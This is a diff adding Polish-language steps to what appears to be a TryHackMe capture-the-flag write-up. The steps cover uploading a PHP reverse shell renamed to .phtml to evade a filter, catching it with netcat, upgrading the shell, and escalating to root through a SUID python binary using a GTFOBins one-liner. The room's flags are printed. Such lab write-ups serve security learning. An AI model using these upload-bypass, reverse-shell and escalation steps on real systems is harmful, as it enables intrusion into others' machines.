@@ -44,7 +44,23 @@ Odpowiedzią na pytanie 5 jest /panel/
 
   2.1 user.txt
 W tym zadaniu będzie sporo kroków do zrobienia, pierwszą naszą rzeczą do zrobienia będzie skopiowanie revershell'a 
+cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop
+Następną rzeczą będzie zmodyfikowanie naszego reverse-shella, pierw zmiana adresu IP tun0, następnie zmianu portu, oczywiście możesz pozostać przy standardowym,
+następnie przed zapisaniem, zapisz ten plik w formacie .phtml bo niestety nasza strona uniemożliwia nam przesłanie pliku w formacie .php
+Kolejnym krokiem po przesłaniu będzie udanie się na stronę /uploads/ przed wejściem w przesłany załącznik wpisałem w terminu nc -lvnp port, następnie wejdź w 
+załącznik po otwarciu załącznika otwórz terminal i ukaże się nam uzyskana powłoka. 
+Jak widzimy nieco ta powłoka jest rozjechana, wykorzystamy do tego pewną komende: python -c 'import pty; pty.spawn("/bin/bash")'
+No i w końcu morzemy przystąpić do poszukiwania flagi. Wyszukamy flagę za pomocą komendy find / -type f -name user.txt 
+Flaga znajduje się w /var/www/user.txt po znalezieniu tej flagi przystąpy do odczytania. THM{y0u_g0t_a_sh3ll}
 
+  3 Privilege escalation
+  3.1 Search for files with SUID permission, which file is weird?
+W tym celu wykorzystamy komende: find / -user root -perm /4000
+Przewinie nam się masa rzeczy ale po szybkiej diagnoznie dochodzimy do wniosku, że musi to być /usr/bin/python 
+  3.2 Find a form to escalate your privileges.
+W tym celu wykorzystamy stronę GTFOBins, wpiszmy python na stronie i ukazuje nam się masa rzeczy jak to eskalować ale my zmierzamy ku znalezieniu SUID,
+ukazuje nam się prosty sposób jak podnieść swoje uprawnienia. /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")' 
+Po wpisaniu tego w nasz terminal uzyskujemy root'a więc przjdźmy do katologu /root i tam znajdue się nasza flaga root.txt. THM{pr1v1l3g3_3sc4l4t10n}  
 
 
 
